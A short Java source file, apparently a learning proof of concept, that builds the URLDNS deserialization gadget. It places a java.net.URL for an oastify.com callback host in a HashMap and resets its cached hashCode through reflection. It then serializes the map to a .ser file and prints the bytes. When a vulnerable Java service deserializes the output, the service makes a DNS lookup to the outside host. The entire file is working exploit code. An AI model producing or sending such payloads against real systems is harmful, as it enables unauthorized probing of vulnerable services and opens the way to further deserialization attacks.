package URLDNS;

import java.io.*;
import java.lang.reflect.Field;
import java.net.URL;
import java.util.Arrays;
import java.util.HashMap;

public class exploit {
    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException {
        HashMap<URL, String> obj = new HashMap<URL, String>();
        String url = "http://llayhmmqixonxqa38uhs0wymedk48uwj.oastify.com";
        URL a_url = new URL(url);
        Class clazz = Class.forName("java.net.URL");
//        Field field = null;
        Field field = clazz.getDeclaredField("hashCode");
        field.setAccessible(true);
        //field.set(a_url, -1 ); There is a problem with putting it here, and you can debug the specific problem yourself
        obj.put(a_url, "Edisc");
        field.set(a_url, -1);
        //
        // serialization
        //
        FileOutputStream fo = new FileOutputStream(System.getProperty("user.dir") + "/src/urldns/urldns.ser");
        ObjectOutputStream obj_out = new ObjectOutputStream(fo);
        obj_out.writeObject(obj);
        obj_out.close();


        ByteArrayOutputStream bo = new ByteArrayOutputStream();
        ObjectOutputStream bo_obj = new ObjectOutputStream(bo);
        bo_obj.writeObject(obj);
        bo_obj.close();
        String bo_str = Arrays.toString(bo.toByteArray());
        System.out.println("serialize byte code");
        System.out.println(bo_str);
    }

}
